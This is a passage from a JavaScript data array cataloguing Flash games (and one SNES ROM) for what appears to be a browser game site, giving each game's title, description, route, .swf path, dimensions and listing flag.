		source: "/swf/binding-of-isaac.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Blast O' Matic",
		description: "You have to set many parameters which affect the way the cannon fires. Do your best and the result will be worth it.",
		tags: "",
		route: "blast-o-matic",
		source: "/swf/blastomatic.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Blobink 2",
		description: "Someone has stolen all the colours. Give everything it's own colour back and beat the big boss.",
		tags: "",
		route: "blobink-2",
		source: "/swf/blobink2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bloons Tower Defense 2",
		description: "Bloons Tower Defense 2 is a popular tower defense game originally released in Flash by Ninja Kiwi. Strategically place your defenses, upgrade your units, and stop all balloons from passing through.",
		tags: "",
		route: "bloons-tower-defense-2",
		source: "/swf/bloons_tower_defense_2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bubble Trouble",
		description: "Clear all the bubbles and get yourself out of trouble! Destroy the bouncing bubbles by splitting them again and again with a line from your harpoon gun, but don't let them touch you! Collect items dropped to gain advantages and score bonus points by eliminating all the bubbles before time runs out. Are you up the challenge?",
		tags: "",
		route: "bubble-trouble",
		source: "/swf/bubbletrouble.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Duck Life 1 (Flash)",
		description: "Duck Life is the first game in the Duck Life series. A tornado has struck your farm and destroyed everything. All that remains is a single duck egg. Train this duckling to peak athletic form so you can earn money to rebuild the farm.",
		tags: "",
		route: "duck-life-1-flash",
		source: "/swf/ducklife1.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Duck Life 2 (Flash)",
		description: "Duck Life 2 is a duck racing game with various training levels to improve your athletic abilities. When you've trained enough, you enter a duck ‘quadrathlon'' that puts your running, climbing, swimming, and flying skills to the test. Just another day in the life of a duck!",
		tags: "",
		route: "duck-life-2-flash",
		source: "/swf/ducklife2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Duck Life 3 (Flash)",
		description: "Duck Life 3 is a duck racing game featuring genetically modified ducks that evolve as you progress. Choose from one of four duck breeds and evolve as you complete each league. Like the previous game, training is essential to level up and improve your abilities.",
		tags: "",
		route: "duck-life-3-flash",
		source: "/swf/ducklife3-evolution.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Duck Life 4 (Flash)",
		description: "Duck Life 4 is a duck racing game set after the ban on genetically modified ducks. A year has passed since the ban on genetically modified ducks and now it's up to you to defeat the world champion. Train your duck team to compete in six new locations around the world.",
		tags: "",
		route: "duck-life-4-flash",
		source: "/swf/ducklife4.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Falldown 2",
		description: "Play Fall Down 2 flash game. Fall Down 2 is a Skill game to play free online. Controls: Use your mouse to play As a comment we let you know that Fall Down 2 game is one of the best skill games and a lot of fun is waiting for you playing Fall Down 2 online game, the game that many players have chosen it as their favorite, make your comparision and we hope you enjoy it. Remember that we offer you the best, funniest and the biggest collection of games in the world to play online.",
		tags: "",
		route: "falldown-2",
		source: "/swf/falldown2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Fancy Pants Adventure",
		description: "Fancy Pants Adventures is a series of free side-scrolling Flash games created by American developer Brad Borne. Four worlds have been released so far. World 1 was released on March 14, 2006 and World 2 was released on January 9, 2008.",
		tags: "",
		route: "fancy-pants-adventure",
		source: "/swf/fancypantsadventure.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Fancy Pants Adventure 2",
		description: "The Fancy Pants Adventures: World 2 is an epic adventure platformer created by Brad Borne. In the first chapter of this legendary series, you will embark on a perilous journey to find your kidnapped sister. Run through dense forests, underwater caverns, and pirate ships while you stomp, kick and slash your enemies with 40 melee weapons. Explore the enchanting maps to find secrets, hidden levels, achievements, costumes, and much more! It's hard not to be amazed by the stunning hand-drawn artwork, satisfying animations, and the good sense of humor in Fancy Pants Adventures. Go ahead, put on your fancy pants and get to work!",
		tags: "",
		route: "fancy-pants-adventure-2",
		source: "/swf/fancypantsworld2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Gun Mayhem 2",
		description: "More explosive arena style action! Battle against the AI or with friends in this cartoony platform shooter. Up to 4 players can play at once!",
		tags: "",
		route: "gun-mayhem-2",
		source: "/swf/gun-mayhem-2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Gun Mayhem",
		description: "More explosive arena style action! Battle against the AI or with friends in this cartoony platform shooter. Up to 4 players can play at once!",
		tags: "",
		route: "gun-mayhem",
		source: "/swf/gun-mayhem.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "The Impossible Quiz 2",
		description: "The Impossible Quiz 2 is the second installment of the hardest trivia quiz on the word wide web. Questions even got more tricky than in the first quiz, which makes this game officially the hardest one available. The creator Splapp-me-do has done everything to make sure you won't succeed in completing this quiz.",
		tags: "",
		route: "impossible-quiz-2",
		source: "/swf/impossiblequiz2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Learn to Fly 1",
		description: "Launch the penguin as far as you can, can you get all the upgrades? If you like this game, make sure to also play Learn to Fly Idle and Learn to Fly 3, the most recent editions!",
		tags: "",
		route: "learn-to-fly-1",
		source: "/swf/learntofly1.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Learn to Fly 2",
		description: "You're a penguin, you learned how to fly... but then icebergs stopped you and crushed your dreams. Now you're back for revenge!",
		tags: "",
		route: "learn-to-fly-2",
		source: "/swf/learntofly2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Madness Project Nexus (Redirect)",
		description: "Project Nexus is a third-person Run n' Gun / Beat'Em Up filled with arcade-style action and button-mashing brutality. Gun your way through droves of bad guys in the Story Campaign, or build your perfect killing machine in the neverending onslaught of Arena Mode.",
		tags: "",
		route: "madness-project-nexus",
		source: "/swf/madness-project-nexus.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Motherload",
		description: "Use your digger to excavate as much ore as possible. Use the money you earn to upgrade your digger and move deeper and deeper underground, to unearth the mysteries from below.",
		tags: "",
		route: "motherload",
		source: "/swf/motherload.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "PacMan",
		description: "Pac-Man is a Japanese video game franchise published, developed and owned by Bandai Namco Entertainment. Entries have been developed by a wide array of other video game companies, including Midway Games, Atari and Mass Media, Inc..",
		tags: "",
		route: "pacman",
		source: "/swf/pacman.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Snake",
		description: "Snake is a video game genre where the player maneuvers a growing line that becomes a primary obstacle to itself. The concept originated in the 1976 two-player arcade game Blockade from Gremlin Industries, and the ease of implementation has led to hundreds of versions for many platforms.",
		tags: "",
		route: "snake",
		source: "/swf/snake.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Super Mario Flash",
		description: "Super Mario Flash 1 is waiting for your action! Explore all levels. This is the most beautiful and most complete Super Mario clone all Mario games we have on our site. You have the choice of Mario or Luigi and can explore all parts of the world thereafter. This game also has a 'Level Editor', wilt thou not always make your own Mario World before? Here you have chance! If you have done a world you can share it with other people. Luigi or his brother to go with the arrow keys and shoot with the spacebar.",
		tags: "",
		route: "super-mario-flash",
		source: "/swf/super-mario-flash.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Super Mario Flash 2",
		description: "The graphics have been improved in this sequel. Choose between Mario or Luigi, complete all the stages and head to the castle to save Princess Peach. Beware of your poweful enemies!",
		tags: "",
		route: "super-mario-flash-2",
		source: "/swf/supermarioflash2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Tetris",
		description: "Tetris is a puzzle video game created by Soviet software engineer Alexey Pajitnov in 1984. It has been published by several companies for multiple platforms, most prominently during a dispute over the appropriation of the rights in the late 1980s.",
		tags: "",
		route: "tetris",
		source: "/swf/tetris.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "The Last Stand Union City",
		description: "Union City, also known as The Dead Zone, is a fictional metropolitan city featured in The Last Stand 2, The Last Stand: Union City, and The Last Stand: Dead Zone. It is also briefly mentioned in The Last Stand. Pre-outbreak, it had a population of 350,148, [n 1] the largest in the state.",
		tags: "",
		route: "the-last-stand-union-city",
		source: "/swf/the-last-stand-union-city.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Worlds Hardest Game 2",
		description: "World's Hardest Game 2 is the second episode of the self-proclaimed world's hardest game series! Hone your reflexes and accuracy as you try to move your little block to the end of each stage without touching the obstacles. Doing so will bring you back to the start so you can try again. The difficulty goes up after every stage, so keep your focus and see how far you can get in the World's Hardest Game 2.",
		tags: "",
		route: "worlds-hardest-game-2",
		source: "/swf/worldshardestgame2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Zombocalypse 2 (Pending Ruffle Issue)",
		description: "Zombocalypse 2 is the most recent edition of the popular zombie shooting game with a lot of interesting game modes and features. The mission of the player is to kill crowds of zombies and survive in this hell. At the beginning of the game, player finds himself in the center of the street and the waves of zombies are slowly coming to eat your brain. You have to fight for your life and unlock different achievements. During the game you will discover different power-ups and new weapons to increase your chances to survive in this hell. There are also some features that will help you to succeed in Zombocalypse 2. For example, if you comlete the combo kill of 25,50 or 100 zombies, you can all air strike to destroy hundreds of zombies at a time. You can also activate the special power-ups that fall from sky.",
		tags: "",
		route: "zombocalypse-2",
		source: "/swf/zombocalypse-2.1.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Zombocalypse",
		description: "Zombocalypse is an awesome zombie blasting 2D game in which fight waves and waves of undead. You might have known this game for a long time and we saved it from perdition along with a flash player. Thanks to this extension, you can continue to play it as long as you like.",
		tags: "",
		route: "zombocalypse",
		source: "/swf/zombocalypse.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Canyon Defense",
		description: "Canyon Defense is an epic tower defense game in which you must attempt to defend your own base in the middle of a desert canyon. You must line the walls of the canyon with defensive towers in order to repel the invading troops.",
		tags: "",
		route: "canyon-defense",
		source: "/swf/Canyon Defense.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Copter",
		description: "Copter game is a flash game for one player where you fly a helicopter through a maze of obstacles. This version is the most popular of helicopter game, being very easy to operate and required almost no skills at all. ... Copter game is played using just one button, the left button of your mouse.",
		tags: "",
		route: "copter",
		source: "/swf/Copter.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Desktop Tower Defence",
		description: "Desktop Tower Defense is a Flash-based tower defense browser game created by Paul Preece in March 2007. The game had been played over 15.7 million times as of July 2007, and was one of Webware 100's top ten entertainment web applications of 2007",
		tags: "",
		route: "desktop-tower-defence",
		source: "/swf/DesktopTowerDefence.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Donkey Kong",
		description: "Donkey Kong is a video game series created by Shigeru Miyamoto. It follows the adventures of an ape named Donkey Kong and his clan of other apes and monkeys. The franchise primarily consists of platform games, originally single-screen action puzzle games and later side-scrolling platformers.",
		tags: "",
		route: "donkey-kong",
		source: "/swf/DonkeyKong.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Draw Play",
		description: "A draw play, or simply draw for short, is a type of American football play. The draw is a running play disguised as a passing play. It is the opposite of a play-action pass, which is a passing play disguised as a running play. The play is often used in long yardage situations.",
		tags: "",
		route: "draw-play",
		source: "/swf/DrawPlay.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Draw Play 2",
		description: "Draw-Play 2 is the sequel to the hugely popular and fun Draw-Play. In this follow-up, the gameplay remains the same - you must help your character through a series of levels by drawing them a path to walk on! In this title, even more, challenges and levels await and you must once again test your drawing skills and logic.",
		tags: "",
		route: "draw-play-2",
		source: "/swf/DrawPlay2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "The Beard",
		description: "This game is all about Tom Fulp's commitment to not shave his face until his next console game, Castle Crashers, is completed. It's a ridiculously over-the-top arcade boss battle that is well worth your time. We hope you enjoy it and discover the secret character!",
		tags: "",
		route: "the-beard",
		source: "/swf/castlecrashingthebeard.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Choose Your Weapon 2",
		description: "Swing and jump in this platformer as you pick the right weapon to kill the enemies on each level.",
		tags: "",
		route: "choose-your-weapon-2",
		source: "/swf/chooseyourweapon2_LB.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Clear Vision",
		description: "Clear Vision is a free sniper game. Between assassination jobs, learn the dark truth about this stick dude's past. It's not pretty. But he does have a nice apartment! This is a stick sniper masterpiece where you take on the role of an assassin who has lead a hard life full of cold blood and hot women. It's a dark world when you're an assassin for hire and even though he may be the best there is at what he does, that doesn't mean what he does is very nice! Use basic sniper mechanics to delve into the questionable past of this hitman as you rack up a kill count and blast your way through his story. This is a story based stick sniper shooter which brings the duo-tone world of hyper-violent stick games to life through its deep characterization, and complex storytelling. You'll be introduced to characters you might not like but you will definitely understand. You will be forced to question your own morals and ethics as you stare down the barrel of a gun and into the yawning chasm of imperfect humans. Stick games are a staple of the casual gaming industry. They have been around longer than any of us and will probably be around a lot longer than any of us. Clear Vision is a step above the rest. It is truly one of the greatest stick sniper games available.",
		tags: "",
		route: "clear-vision",
		source: "/swf/clear-vision.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Clear Vision Elite",
		description: "Clear Vision Elite is a free stick-sniper game. Clear Vision is back! This time with a kitchen, a computer, an office, and all sorts of things that aren't sniping --which is the point of the game. But, don't be confused, this is a sniper game. You'll have to click through lists, and go through different rooms and get all wrapped up in a plot line but at the end of all that after you bought your ammo and checked a name off a list and cleaned your kitchen or whatever: You will finally get to do some sniping! And it is worth it. The physics, the puzzles, the stick men, the aiming. It all comes together with your choice of guns and ammo to create a truly immersive sniper experience. Is it revenge, are you trying to save the world? Are you doing it just for the money? Only those who read through the multiple screens at the beginning of the game will know for sure. This is an exciting sniper adventure where you take on the underground gangs of the world and dish out justice from behind the business end of a smoking gun. Ready, aim, fun!",
		tags: "",
		route: "clear-vision-elite",
		source: "/swf/clearvisionelite.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Crazy Taxi",
		description: "Petrol heads unite in this crash and burn style of driving game. Crazy Taxi Game is an online crazy driving complete with the crazy cabbie, the colored cars, the long desert highways, and the freaky car jumping. If you love the car chases in Taxi 2, play taxi driver man and recreate the riveting speed runs as you rush to beat the time. Hurry up and pump in the adrenaline to switch to the open lanes at the perfect time before they cut you off. Pound those keyboard arrow keys to accelerate forward and pass the cars blocking you ahead and keeping you from crossing the crucial time lines. Your quick thinking will be the deciding factor to garner the top spots in the scoring list. Each checkpoint you make adds up an additional time which means more asphalt to run. Failing to reach a checkpoint when the time runs out will mean that your mission is over. That s why failure is not an option for the speed freaks. There s not much need to decelerate, instead you must accelerate all you can! What are you waiting for? Pay the fare, and do the run of your life with Crazy Taxi Game.",
		tags: "",
		route: "crazy-taxi",
		source: "/swf/crazy-taxi.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Cursor 10",
		description: "Use your 10 cursors to reach the 16th floor. As your previous lives are replayed, try to cooperate with yourself to reach the goal.",
		tags: "",
		route: "cursor-10",
		source: "/swf/cursor10.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Cut The Rope (File not found)",
		description: "Cut the Rope is a Russian series of physics-based puzzle video games developed by the Russian entertainment company ZeptoLab for several platforms and devices.",
		tags: "",
		route: "cut-the-rope",
		source: "/swf/cut-the-rope.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Dad N' Me",
		description: "Dad n' Me is a brawler/ fighting game created by Tom Fulp and Dan Paladin, creators of Alien Hominid,in 2005. It is seen by many as the game which popularized flash games, as for its time it was unique as it was very advanced in a genre that was seen by some as primitive.",
		tags: "",
		route: "dad-n-me",
		source: "/swf/dadnme.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Dance of the Robots",
		description: "Dodge the bombs that keep on dropping. Careful more and more drop as it gets crazier.",
		tags: "",
		route: "dance-of-the-robots",
		source: "/swf/danceoftherobots.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Defend Your Castle (File not found)",
		description: "Defend Your Castle is a series of video games developed by XGen Studios. The original version of Defend Your Castle is a Macromedia Flash-based browser game. It requires the player to kill all enemy units before they destroy the player's castle.",
		tags: "",
		route: "defend-your-castle",
		source: "/swf/defend-your-castle.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Dental Adventure",
		description: "Always wanted to be a dentist? Well, even if you have not, you'll have lots of fun drilling teeth, filling cavities, and using your dental skills to solve lots of dental dilemmas. Hit the road with Glenn Martin, DDS and family and travel cross-country to 8 destinations, meeting new people and their mouths",
		tags: "",
		route: "dental-adventure",
		source: "/swf/dental-adventure.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Duck Hunt",
		description: "Duck Hunt is a fantastic arcade game that takes inspiration from the original classic available on Nintendo game systems. You must shoot the moving ducks down with your mouse and see how many points you can score.",
		tags: "",
		route: "duck-hunt",
		source: "/swf/duck-hunt.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "DX Hockey",
		description: "What about a relaxed game of table hockey? DX Hockey is an air hockey game with different style, more bonus features and nice graphics. In this mouse driven air hockey game you have to beat your computer opponent, also collect those extra items! Use the mouse to move the puck in your area and try to accumulate seven points to proceed to the next level. Get all bonus items to have an advantage. Collect passwords and use them to continue to different game levels. There is total of 8 levels in this cool air hockey game called DX Hockey. Can you finish them all?",
		tags: "",
		route: "dx-hockey",
		source: "/swf/dxhockey.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bloxors",
		description: "Get the block to fall into the square hole to progress to the next level…",
		tags: "",
		route: "bloxors",
		source: "/swf/Bloxors.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bullet Bill 2",
		description: "Take a turn with the bullets of Super Mario Brothers. These bullets take flight and it's your job to see them safely to the end. Can you kill the goombas on the way?",
		tags: "",
		route: "bullet-bill-2",
		source: "/swf/Bullet Bill 2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bullet Bill 3",
		description: "Smash your way through 54 exciting levels, or make your own with new level creation tools!",
		tags: "",
		route: "bullet-bill-3",
		source: "/swf/Bullet Bill 3.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bomb a Bomb",
		description: "Bomb It 4 is the fourth version of this fantastic Bomberman style game in which you must test out your bomb dropping skills on a myriad of different levels. The gameplay remains the same as the previous versions - you control a single character and you must move around each level and deploy bombs to try and destroy your enemies without being killed yourself.",
		tags: "",
		route: "bomb-a-bomb",
		source: "/swf/bombabomb.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bow Man",
		description: "Bowman is an archery game where you and an opponent take shots at each other. You win when you've hit the opponent fatally. It can take a few arrows. Bowman can be played against the computer or via local multiplayer.",
		tags: "",
		route: "bow-man",
		source: "/swf/bowman.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bow Man 2",
		description: "Become a master of archery in Bowman 2! You need to define the shooting angle and aim carefully. Your mission is to eliminate the opponent by successfully hitting them. Have fun!",
		tags: "",
		route: "bow-man-2",
		source: "/swf/bowman2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bowmaster",
		description: "A brand new version of the world-famous multiplayer game with bowmen — a hotsy-totsy aim and shoot game Bowmasters has in store for you: • 60+ INSANE CHARACTERS from all dimensions absolutely for free! • 60+ DIFFERENT WEAPONS for total mayhem, awesome fatalities with rag-doll physics!",
		tags: "",
		route: "bowmaster",
		source: "/swf/bowmaster.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bowmaster Prelude",
		description: "Bowmaster Prelude is one of the original browser games and was released over 10 years ago! ... You control a brave Bowmaster and you must manually fire arrows at the incoming knights and warriors. Take into consideration the angle and power of your bow shots and also the movement of the enemies.",
		tags: "",
		route: "bowmaster-prelude",
		source: "/swf/bowmasterprelude.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bubble Shooter",
		description: "Bubble Shooter is a clone of the Puzzle Bobble arcade game that was released by Taito in 1994. The Bubble Shooter game and IP are owned by Ilyon Dynamics, after they were acquired from Absolutist who released the original game in 2002. The game was ported to iOS in 2010, and was ported to Android in 2012.",
		tags: "",
		route: "bubble-shooter",
		source: "/swf/bubble shooter.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bubble Tanks 2",
		description: "Similar to BT1, you must travel through giant bubbles, destroying enemy tanks and taking their bubbles to fuel your growth. As you grow, you constantly evolve and get ever better weapons. Ultimately, you'll have to face the ultimate adversary and defeat it to win the game.",
		tags: "",
		route: "bubble-tanks-2",
		source: "/swf/bubble_tanks_2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bullet Bill",
		description: "Use the arrow keys to move this bullet around the Mushroom Kingdom. Dodge the obstacles and get the highest score!",
		tags: "",
		route: "bullet-bill",
		source: "/swf/bullet-bill.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Burger Tycoon",
		description: "Welcome back on the land where you always get to have the best time of your life, dearest friends, because on our site games-kids.com you will find nothing but the best and most exciting games, and we truly hope that you're willing to join us today within these great adventures as well as you did in all of them. Today's following game is called Burger Tycoon, and it's quite a thinking and management type of game, in which you'll have to run a very successful, yet hard business. We say that it's hard to keep a burger tycoon running, because you need to take care of so many things, such as your own crops you will use for the cows, the factory itself, the board of directors and other departments, and your restaurant of course. We know that you kids are going to do a wonderful job today, in Burger Tycoon, and we wish you guys good luck and we hope you'll have a blast!",
		tags: "",
		route: "burger-tycoon",
		source: "/swf/burgertycoon.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Bot Arena 3 (File not found)",
		description: "Build a team of bots by following the instructions in the game. Each bot is composed of a chassis, plating, and weapon. After purchasing the items; first mount the plating to the chassis. Second mount the weapon to the plating. You can purchase more than one bot. Once you have built your team, click start battle to choose your tournament. Better chassis, plating, and weapon upgrades will be available as you advance through the tournament. During battle you can click and drag your bot to the desired location.",
		tags: "",
		route: "bot-arena-3",
		source: "/swf/bot-arena-3.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: false
	},
	{
		title: "Boxhead 2",
		description: "Boxhead 2 is ta free online combat games. Lock and load your favorite item, take on the whole world in slo mode or tag in a friend to blast away at the competition back to back like in your favorite action movie. The choice is yours! ... You'll be going toe to toe with other players from around the world.",
		tags: "",
		route: "boxhead-2",
		source: "/swf/dagobah_boxhead_2play.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Electric Man",
		description: "Electric Man is an awesome stickman fighter Flash game in which you must fight against a range of opponents using a variety of different punch and kick combos. Before you enter the game, you can choose the name and color of your stickman, and also the difficulty level (easy, normal or pro). Once you have chosen your character you can then complete a tutorial that shows you the basic game mechanics and move sets.",
		tags: "",
		route: "electric-man",
		source: "/swf/ElectricMan.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Excite Bike",
		description: "Excitebike is a motocross racing video game developed and published by Nintendo. In Japan, it was released for the Famicom in 1984 and then ported to arcades as Vs. Excitebike for the Nintendo Vs. System later the same year.",
		tags: "",
		route: "excite-bike",
		source: "/swf/ExciteBike.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Feudalism 2",
		description: "Feudalism 2 is a free fighter game. As they say, the world isn't going to conquer itself. In Feudalism 2, that's your job. In this strategy game with a helping of RPG fixings, select a character, bolster your army with a little gold, and then start conquering. ... Prove just how effective a little bit of feudalism can be.",
		tags: "",
		route: "feudalism-2",
		source: "/swf/Feudalism2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Flood Runner 3",
		description: "Introducing the third instalment of Flood Runner! The aim is still to run and jump from one platform to the next to escape the wave that's hot on your heels. Flood Runner 3 has improved graphics and the game itself is a little less tricky than the previous episodes. If you fall into the water or lava, perform a QTE to survive and rejoin the race.",
		tags: "",
		route: "flood-runner-3",
		source: "/swf/Flood_Runner3.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Flood Runner 4",
		description: "Flood Runner 4 is an endless runner game. Run from flood and giant monsters. Avoid challenging obstacles and try to survive as long as possible. Have Fun!",
		tags: "",
		route: "flood-runner-4",
		source: "/swf/Flood_Runner_4.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Flood Runner 2",
		description: "A huge wave is chasing you fast. Your goal is to beat the incoming flood by running fast and using the springs for big bounces and jump on the ramps for a boost. The surfboard will only save your life once. Run for your life and don't let the tsunami get you.",
		tags: "",
		route: "flood-runner-2",
		source: "/swf/The_Flood_Runner_2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Earthbound",
		description: "EarthBound, released in Japan as Mother 2: Gīgu no Gyakushū, is a role-playing video game developed by Ape Inc. and HAL Laboratory and published by Nintendo for the Super Nintendo Entertainment System. The second entry in the Mother series, it was first released in Japan in August 1994, and in North America in June 1995. As Ness and his party of four, Paula, Jeff and Poo, the player travels the world to collect melodies from eight Sanctuaries in order to defeat the universal cosmic destroyer Giygas.",
		tags: "",
		route: "earthbound",
		source: "/emulator/snes/earthbound.smc",
		gameType: "snes",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Effing Worms",
		description: "Effing Worms is a free stick game. Don't you wish you were a giant worm? Dig fast tunnels, and surprise hippies, cops, cows and pedestrians from below! Feed the beast, baby!",
		tags: "",
		route: "effing-worms",
		source: "/swf/effingworms.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Fat Ninja",
		description: "Who says a Fat Ninja can't be just as good as a skinny ninja? Well, many people are saying that, but you are here to play the role of one in a brand new action-adventure fighting game with ninjas offered to you free of charge on our website, where despite being overweight, you and your avatar will give it your best to kick ass and defeat all the enemies, just like any shinobi would honor their mission by doing!",
		tags: "",
		route: "fat-ninja",
		source: "/swf/fat-ninja.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Feudalism",
		description: "Feudalism is an open world battle game in which you need to manage your soldiers and expand your power.",
		tags: "",
		route: "feudalism",
		source: "/swf/feudalism.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Flashcraft",
		description: "If you are looking for exciting adventures and a lot of fun, then this game is for you! Flash Craft was created by a team of professionals, so that you fully enjoy the easy controls, impeccable interface and an exciting game. There are Survival and Creative modes, day and night, weather changes and seasons.",
		tags: "",
		route: "flashcraft",
		source: "/swf/flashcraft.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Free Rider 2",
		description: "Free Rider 2 is the second episode of Free Rider, a bike riding game with a DIY track-drawing feature.",
		tags: "",
		route: "free-rider-2",
		source: "/swf/freerider2.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Frogger",
		description: "Frogger is a 1981 arcade action game developed by Konami and manufactured by Sega. In North America, it was released by Sega/Gremlin. The object of the game is to direct frogs to their homes one by one by crossing a busy road and navigating a river full of hazards.",
		tags: "",
		route: "frogger",
		source: "/swf/frogger.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Grow RPG",
		description: "Grow RPG is a cool turn based RPG game in which you must build up your kingdom and fight against the evil demon who is trying to destroy your world. Each turn you must place an object in your world such as a tree, a house, some stone, a chest or water for example.",
		tags: "",
		route: "grow-rpg",
		source: "/swf/growrpg.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Gods Playing Field",
		description: "God's Playing Field is a free strategy game. You decide who lives and dies. If you've ever wanted a chance to play God, this is it.",
		tags: "",
		route: "gods-playing-field",
		source: "/swf/Gods Playing Field.swf",
		gameType: "flash",
		width: "1000px",
		height: "625px",
		listed: true
	},
	{
		title: "Grid Lock",
		description: "Locked up blocks on the grid. Is there anything more we can explain to you?",
		tags: "",
		route: "grid-lock",
